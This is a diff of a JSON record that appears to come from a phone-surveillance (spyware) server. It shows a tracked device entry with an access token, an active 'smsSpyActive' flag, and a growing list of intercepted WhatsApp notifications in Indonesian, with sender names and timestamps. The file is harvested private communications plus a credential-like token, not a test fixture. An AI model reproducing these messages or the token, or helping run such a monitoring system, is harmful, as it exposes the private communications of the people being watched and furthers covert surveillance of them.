@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776956605748,
+    "lastSeen": 1776956620763,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎71 pesan dari 41 chat",
+        "time": "23/04 23:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776956621709
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776956607840
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776956607824
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 20:35",
         "pkg": "com.whatsapp",
         "receivedAt": 1776947738304
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎76 pesan dari 44 chat",
-        "time": "23/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776947733867
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Oi: BEW STORE",
-        "content": ".cp",
-        "time": "23/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776947733555
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776947711591
       }
     ],
     "galleryPhotos": [],
